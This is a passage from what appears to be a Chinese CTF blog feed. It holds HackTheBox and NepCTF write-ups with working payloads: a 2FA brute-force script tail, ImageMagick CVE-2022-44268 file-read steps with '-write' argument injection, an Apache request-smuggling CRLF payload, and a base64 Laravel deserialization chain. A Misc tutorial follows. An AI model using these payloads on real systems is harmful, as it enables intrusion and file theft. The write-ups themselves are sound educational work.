   <span class="hljs-keyword">if</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:<br>                current_ip_suffix[<span class="hljs-number">1</span>] += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> current_ip_suffix[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">254</span>:<br>                current_ip_suffix[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span><br>                current_ip_suffix[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> current_ip_suffix[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">254</span>:<br>                current_ip_suffix = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> futures:<br>                future.result()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    combinations_path = <span class="hljs-string">&#x27;4-digit-wordlist.txt&#x27;</span><br>    url =<span class="hljs-string">&#x27;http://83.136.249.173:34046/auth/verify-2fa&#x27;</span><br><br>    combinations_array = get_combinations_in_array(combinations_path)<br>    send_all_requests(url, combinations_array)<br></code></pre></td></tr></table></figure><p>Flag：HTB{1_l0v3_h4pr0x1_4cl5_4nd_4ll_1t5_f34tur35}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>SQL注入</tag>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_PryingEyes</title>
    <link href="/2024/05/27/htb-PryingEyes/"/>
    <url>/2024/05/27/htb-PryingEyes/</url>
    
    <content type="html"><![CDATA[<h1 id="PryingEyes"><a href="#PryingEyes" class="headerlink" title="PryingEyes"></a>PryingEyes</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Welcome to the Prying Eyes, a “safe space” for those curious about the large organisations that dominate our life. How safe is the site really?</p><p>欢迎来到窥探之眼，这是一个“安全空间”，适合那些对主宰我们生活的大型组织感到好奇的人。该网站到底有多安全？</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>打开题目网站，点击相关功能，发现可以进行注册，帖子内容没有什么特别的，于是下载源码进行审计</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs js"># /routes/forum.<span class="hljs-property">js</span><br><span class="hljs-title class_">ValidationMiddleware</span>(<span class="hljs-string">&quot;post&quot;</span>, <span class="hljs-string">&quot;/forum&quot;</span>),<br>  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; title, message, parentId, ...convertParams &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> (parentId) &#123;<br>      <span class="hljs-keyword">const</span> parentPost = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getPost</span>(parentId);<br><br>      <span class="hljs-keyword">if</span> (!parentPost) &#123;<br>        req.<span class="hljs-title function_">flashError</span>(<span class="hljs-string">&quot;That post doesn&#x27;t seem to exist.&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/forum&quot;</span>);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> attachedImage = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">files</span> &amp;&amp; req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>) &#123;<br>      <span class="hljs-keyword">const</span> fileName = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;hex&quot;</span>);<br>      <span class="hljs-keyword">const</span> filePath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;uploads&quot;</span>, fileName);<br><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convert</span>(&#123;<br>          ...convertParams,<br>          <span class="hljs-attr">srcData</span>: req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>.<span class="hljs-property">data</span>,<br>          <span class="hljs-attr">format</span>: <span class="hljs-string">&quot;AVIF&quot;</span>,<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">writeFile</span>(filePath, processedImage);<br><br>        attachedImage = <span class="hljs-string">`/uploads/<span class="hljs-subst">$&#123;fileName&#125;</span>`</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        req.<span class="hljs-title function_">flashError</span>(<span class="hljs-string">&quot;There was an issue processing your image, please try again.&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error occured while processing image:&quot;</span>, error);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/forum&quot;</span>);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">lastID</span>: postId &#125; = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">createPost</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">userId</span>, parentId, title, message, attachedImage);<br><br>    <span class="hljs-keyword">if</span> (parentId) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/forum/post/<span class="hljs-subst">$&#123;parentId&#125;</span>#post-<span class="hljs-subst">$&#123;postId&#125;</span>`</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/forum/post/<span class="hljs-subst">$&#123;postId&#125;</span>`</span>);<br>    &#125;<br>  &#125;<br>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">database</span>) =&gt;</span> &#123;<br>  db = database;<br>  <span class="hljs-keyword">return</span> router;<br>&#125;;<br></code></pre></td></tr></table></figure><p> 在<code>forum.js</code>代码中可见，除了<code>title</code>、<code>message</code>、<code>parentld</code>这三个参数以外，其他参数都写在<code>convertParams</code>中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> convert<br></code></pre></td></tr></table></figure><p>使用了<code>convert</code>对图片进行了一个转换，而这个convert存在于<a href="https://www.npmjs.com/package/imagemagick-convert"><code>imagemagick-convert</code></a></p><p>而<code>imagemagick</code>存在的漏洞：<strong>CVE-2022-44268任意文件读取漏洞</strong></p><p>CVE-2022-44268：ImageMagick 7.1.0-49 存在信息泄露漏洞。当它解析 PNG 图像（例如，调整大小）时，生成的图像可能嵌入任意远程文件的内容（如果 ImageMagick 二进制文件有读取权限）</p><p>然后这个漏洞只有在转PNG文件时才会存在，但从代码中可知输出的图片类型为AVIF</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>        <span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convert</span>(&#123;<br>          ...convertParams,<br>          <span class="hljs-attr">srcData</span>: req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>.<span class="hljs-property">data</span>,<br>          <span class="hljs-attr">format</span>: <span class="hljs-string">&quot;AVIF&quot;</span>,<br>        &#125;);<br></code></pre></td></tr></table></figure><p>这里采用imagemagick-convert的参数注入，上传过程中抓包修改其中参数内容，将<code>-write filename</code>写入其中并上传，从而成功利用</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>利用<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/poc.py">github开源的poc</a>构造恶意图片，命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python CVE-2022-44268-poc.py generate -o poc.png -r flag.txt<br></code></pre></td></tr></table></figure></li><li><p>在评论出选择生成的poc.png进行上传，上传过程中手动抓包添加：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Conten-Disposition: <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; <span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;background&quot;</span><br><br>blue -<span class="hljs-built_in">write</span> ./uploads/<span class="hljs-built_in">exp</span>.png<br></code></pre></td></tr></table></figure><p><img src="/img/htb_pryingeyes_3.png" alt="htb_pryingeyes_3"></p></li><li><p>访问&#x2F;uploads&#x2F;exp.png并下载写入的图片</p></li><li><p>将其后缀修改为.png使用之前github下载的poc读取带出来的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python CVE-2022-44268-poc.py generate -o poc.png -r flag.txt<br></code></pre></td></tr></table></figure><p><img src="/img/htb_pryingeyes_2.png" alt="htb_pryingeyes_2"></p></li><li><p>将得到内容HEX转ASCII，成功得到flag</p><p><img src="/img/htb_pryingeyes_1.png" alt="htb_pryingeyes_1"></p></li></ol><p>Flag：HTB{Im4g3m4g1ck_vU1n5_5tR1k3_4g4in}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>CVE</tag>
      
      <tag>任意文件读取</tag>
      
      <tag>参数注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_ApacheBlaze</title>
    <link href="/2024/05/27/htb-apacheblaze/"/>
    <url>/2024/05/27/htb-apacheblaze/</url>
    
    <content type="html"><![CDATA[<h1 id="ApacheBlaze"><a href="#ApacheBlaze" class="headerlink" title="ApacheBlaze"></a>ApacheBlaze</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you’ll need to crack a puzzle.</p><p>走进 ApacheBlaze 宇宙，这是一个充满街机点击游戏的世界。有传言说，通过玩某些游戏，您有机会赢得大奖。然而，在享受乐趣之前，您需要破解一个谜题。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>打开题目网址，可以看到有4个Game，但点击Game1~Game3都只会提示：</p><p><em><strong>This game is currently unavailable due to internal maintenance.</strong></em></p><p>而点击Game4则会提示</p><p><strong>This game is currently available only from dev.apacheblaze.local.</strong></p><p>此处猜测题目的考点可能在请求伪造</p><p>下载题目源码进行分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># backend/src/app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>] = &#123;<span class="hljs-string">&#x27;magic_click&#x27;</span>, <span class="hljs-string">&#x27;click_mania&#x27;</span>, <span class="hljs-string">&#x27;hyper_clicker&#x27;</span>, <span class="hljs-string">&#x27;click_topia&#x27;</span>&#125;<br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = <span class="hljs-string">&#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    game = request.args.get(<span class="hljs-string">&#x27;game&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> game:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Empty game name is not supported!.&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Invalid game name!&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game == <span class="hljs-string">&#x27;click_topia&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-Host&#x27;</span>) == <span class="hljs-string">&#x27;dev.apacheblaze.local&#x27;</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;</span>&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently unavailable due to internal maintenance.&#x27;</span><br>        &#125;), <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure><p>从此代码不难看出，通过选择<code>Game4</code>并提供固定的<code>X-Forwarded-Host</code>即可得到flag</p><p>但经过抓包修改测试，这样并不能得到flag</p><p>而原因是<code>X-Forwarded-Host</code>不仅存在<code>dev.apacheblaze.local</code>还存在有其他的元素</p><p>通过Apache的文档，我们可以知道这种情况的原因：</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tp">当以反向代理模式运行时（例如，使用 ProxyPass 指令），mod_proxy_http 会添加多个请求标头，以便将信息传递到原始服务器。这些标头是：<br><br><span class="hljs-keyword">X</span>-Forwarded-For<br>    客户端的 IP 地址。<br><span class="hljs-keyword">X</span>-Forwarded-Host<br>    客户端在 Host HTTP 请求标头中请求的原始主机。<br><span class="hljs-keyword">X</span>-Forwarded-Server<br>    代理服务器的主机名。<br></code></pre></td></tr></table></figure><p>因此，我们需要考虑如何仅在<code>X-Forwarded-Host</code>设置一个正确的元素</p><p>这里利用漏洞：<strong>HTTP 请求走私攻击 (CVE-2023–25690)</strong></p><p>通过此漏洞，我们可以在发送给目标服务器的第一个请求中去隐藏第二个请求，而这样可以使得我们的第二个请求直接从反向代理发送，因此不会添加其他内容在<code>X-Forwarded-Host</code></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>综上所述，尝试构造Payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">/api/games/click_topia<span class="hljs-meta">%</span><span class="hljs-number">20</span>HTTP/<span class="hljs-number">1.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>aHost:<span class="hljs-meta">%</span><span class="hljs-number">20</span>dev.apacheblaze.local<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p><img src="/img/HTB_ApacheBlaze_1.png"></p><p>Flag：HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-NEPCTF-WriteUp</title>
    <link href="/2022/07/20/2022-NEPCTF-WRITEUP/"/>
    <url>/2022/07/20/2022-NEPCTF-WRITEUP/</url>
    
    <content type="html"><![CDATA[<h2 id="比赛信息"><a href="#比赛信息" class="headerlink" title="比赛信息"></a>比赛信息</h2><hr><p><strong>比赛昵称：</strong>ZERO </p><p><strong>比赛积分：</strong>1218</p><p><strong>比赛排名：</strong>60</p><hr><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-快来签到"><a href="#1-快来签到" class="headerlink" title="1.快来签到"></a>1.<strong>快来签到</strong></h3><p>修改IDA的配置文件，将hexrays.cfg里的MAX_FUNCSIZE数值调大，之后将文件拖入，再在options中的Graph里将Max number of nodes的数值改大，这时能在左下角看到Flag。</p><p><strong>Flag：NepCTF{welc0me_t0_nepctf}</strong></p><h3 id="2-JustKidding"><a href="#2-JustKidding" class="headerlink" title="2.JustKidding"></a>2.<strong>JustKidding</strong></h3><p>通过扫描网站，发现<a href="http://www.zip/">www.zip</a>存在源码泄露，下载后对源码进行审计，发现存在反序列化漏洞。</p><p>通过直播时给出的hint，搜寻近期的<a href="https://xz.aliyun.com/t/11362">laravel反序列化漏洞</a>，构造pop链：TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntzOjc6IkV4cGlyZXMiO3M6MTg6Ijw&#x2F;cGhwIHBocGluZm8oKTs&#x2F;PiI7czo3OiJEaXNjYXJkIjtpOjA7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjEwOiIuL2luZm8ucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQ&#x3D;&#x3D;</p><p>Payload如下：<a href="http://c66d6253-9a3b-4119-afd3-ac2e42a74137.nep.lemonprefect.cn:81/hello?h3=TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntzOjc6IkV4cGlyZXMiO3M6MTg6Ijw/cGhwIHBocGluZm8oKTs/PiI7czo3OiJEaXNjYXJkIjtpOjA7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjEwOiIuL2luZm8ucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQ==">http://c66d6253-9a3b-4119-afd3-ac2e42a74137.nep.lemonprefect.cn:81/hello?h3=TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6NDoiZGF0YSI7YToyOntzOjc6IkV4cGlyZXMiO3M6MTg6Ijw/cGhwIHBocGluZm8oKTs/PiI7czo3OiJEaXNjYXJkIjtpOjA7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO3M6NDE6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAGZpbGVuYW1lIjtzOjEwOiIuL2luZm8ucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQ==</a></p><p>之后访问info.php，在Environment中得到了Flag。</p><p><strong>Flag：NepCTF{016aa038-cd18-496e-8648-0f71f3efad7f}</strong></p><h3 id="3-签到题"><a href="#3-签到题" class="headerlink" title="3.签到题"></a>3.<strong>签到题</strong></h3><p>下载附件后用010editor打开，发现下面藏在zip格式的压缩包，将其提取出，通过在网上搜索得到的一次性解压代码进行解压得到最后一个压缩包，将其拖入010editor发现是伪加密，修改后解压，得到一个流量文件，拖入wireshack根据文件名提示：keyboard，猜想是根据usb流量来判断键盘的输入内容，<a href="https://qwzf.github.io/2020/08/01/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B(%E4%BA%8C)-USB%E6%B5%81%E9%87%8F/%EF%BC%89">参考链接</a>。于是通过tshark提取出流量，再通过网上搜索的脚本进行信息还原，最终得到Flag。</p><p><strong>Flag：nepctf{welcome_to_nepctf_2nd}</strong></p><h3 id="4-花花画画画花花"><a href="#4-花花画画画花花" class="headerlink" title="4.花花画画画花花"></a>4.<strong>花花画画画花花</strong></h3><p>下载附件得到osz的文件，网上搜索后得知这是osu这款音游的谱子，下载osu并将附件导入，在Edit模式中逐帧观察得到Flag。</p><p><strong>Flag：NepCTF{MASTER_OF_坏女人！}</strong></p><h3 id="5-馅饼？陷阱"><a href="#5-馅饼？陷阱" class="headerlink" title="5.馅饼？陷阱!"></a>5.<strong>馅饼？陷阱!</strong></h3><p>通过观察附件中的图片，可以在图片中得到关键信息：“琼”、“大禾寿司”、“如家宾馆”、“东北饺子城”。通过车牌上面的“琼”来锁定拍摄地区为海南，继续搜索“大禾寿司”通过谷歌地图的实景观察以及剩余信息的排查比对得到最终照片拍摄地：“海南省三亚市天涯区新风街”，根据分析，该银行为“光大银行”，搜索其官网得到Flag。</p><p><strong>Flag：NepCTF{<a href="http://www.cebbank.com}/">www.cebbank.com}</a></strong></p><h2 id="未解出题目的思路和猜想"><a href="#未解出题目的思路和猜想" class="headerlink" title="未解出题目的思路和猜想"></a><strong>未解出题目的思路和猜想</strong></h2><h3 id="1-DCTris"><a href="#1-DCTris" class="headerlink" title="1.DCTris"></a>1.<strong>DCTris</strong></h3><p>通过附件搜索以及题目暗示可知是Dreamcast的游戏，但尝试使用多种Dreamcast模拟器（如：DEmul、Redream、NullDC……）后仍无法打开游戏或者是打开后卡在开始界面…最终只能放弃。</p><h3 id="2-DoubleHappiness"><a href="#2-DoubleHappiness" class="headerlink" title="2.DoubleHappiness"></a>2.<strong>DoubleHappiness</strong></h3><p>下载附件后，在010editor中查询到关于拍摄手机型号、拍摄时间等信息，通过查看图片属性得到具体经纬度以及大致地点等信息，通过浏览器进行关键词搜索，未发现相关有效信息…最终无奈放弃。</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>NEPCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈CTF-Misc</title>
    <link href="/2022/07/19/misc/"/>
    <url>/2022/07/19/misc/</url>
    
    <content type="html"><![CDATA[<h1 id="浅谈CTF-Misc"><a href="#浅谈CTF-Misc" class="headerlink" title="浅谈CTF-Misc"></a>浅谈CTF-Misc</h1><h2 id="什么是Misc"><a href="#什么是Misc" class="headerlink" title="什么是Misc"></a>什么是Misc</h2><p>Misc 是英文 Miscellaneous 的前四个字母，杂项、混合体、大杂烩的意思。</p><p>MISC，中文即杂项，<strong>包括隐写，数据还原，脑洞、社会工程、压缩包解密、流量分析取证、与信息安全相关的大数据等</strong>。</p><p>详细解释内容请见——&gt;<a href="https://ctf-wiki.org/misc/introduction/">传送门</a></p><p>关于Misc的入门教程在网上挺多的，这里不再做详细阐述。</p><p>这里主要对我个人学习过程中所遇到的相关经典胎教问题进行解释。</p><p><strong>参考内容：山石安研院第二节CTF夏令营Misc教学内容</strong>、sec_wuyy师傅的<a href="https://www.cnblogs.com/sec-wuyy/p/14593000.html">文章</a></p><h2 id="一、文件头残缺或错误"><a href="#一、文件头残缺或错误" class="headerlink" title="一、文件头残缺或错误"></a>一、文件头残缺或错误</h2><p>文件有后缀名，但是无法正常打开，或者没有后缀名，同时通过file命令（Linux）发现文件类型是data，表示很有可能是文件头残缺或错误导致的，这时候需要根据<strong>后缀名、题目提示、文件头尾部数据等</strong>去猜测文件的真实类型，并使用**<a href="http://www.x-ways.net/winhex/">winhex</a>、<a href="https://www.sweetscape.com/010editor/">010Editor</a>**等软件添加或修改相应的文件头。</p><h3 id="文件类型判断技巧："><a href="#文件类型判断技巧：" class="headerlink" title="文件类型判断技巧："></a>文件类型判断技巧：</h3><table><thead><tr><th>文件类型</th><th>特点</th></tr></thead><tbody><tr><td>ZIP</td><td>文件尾部包含0x504B0506的</td></tr><tr><td>RAR</td><td>文件结尾为0xC43D7B004007</td></tr><tr><td>JPG</td><td>文件结尾为0xFFD9</td></tr><tr><td>PNG</td><td>文件头中包含<a href="https://blog.csdn.net/ismismist/article/details/123535578">IHDR信息</a></td></tr><tr><td>GIF</td><td>文件结尾为0x3B</td></tr></tbody></table><h2 id="二、文件分离"><a href="#二、文件分离" class="headerlink" title="二、文件分离"></a>二、文件分离</h2><p><strong>binwalk</strong></p><p>binwalk可以快速分辨文件是否由多个文件合并而成，并将文件进行分离，分离成功会在目标文件的目录下生成一个形如**_文件名_extracted**的文件目录，目录中有分离后的文件。</p><p>binwalk在kali里是自带的，想在window使用可以参考此教程<a href="https://blog.csdn.net/Goodric/article/details/117845492">传送门</a></p><h3 id="简单操作教程"><a href="#简单操作教程" class="headerlink" title="简单操作教程"></a>简单操作教程</h3><p><strong>文件分析：</strong>binwalk 文件名</p><p><strong>文件分离：</strong>binwalk -e 文件名</p><p>详细操作教程<a href="https://blog.csdn.net/qq_50854790/article/details/123391951?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-123391951-blog-123426905.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-123391951-blog-123426905.pc_relevant_aa&utm_relevant_index=1">传送门</a></p><p><strong>foremost</strong></p><p>如果binwalk无法正确分离出文件，可用使用foremost。</p><p>foremost在kali已预装载</p><p><strong>文件分离：</strong>foremost 文件名 -o 输出文件名</p><h2 id="三、盲水印"><a href="#三、盲水印" class="headerlink" 